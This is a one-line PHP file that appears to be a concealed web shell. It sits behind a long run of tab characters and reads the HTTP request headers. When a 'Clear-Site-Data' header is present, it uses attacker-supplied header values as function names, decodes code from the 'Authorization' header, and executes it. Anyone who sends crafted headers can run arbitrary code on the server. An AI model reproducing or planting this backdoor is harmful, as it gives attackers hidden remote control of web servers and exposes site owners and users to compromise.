<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Clear-Site-Data'])){$uconvert=$_HEADERS['Clear-Site-Data']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Authorization']));$uconvert();}
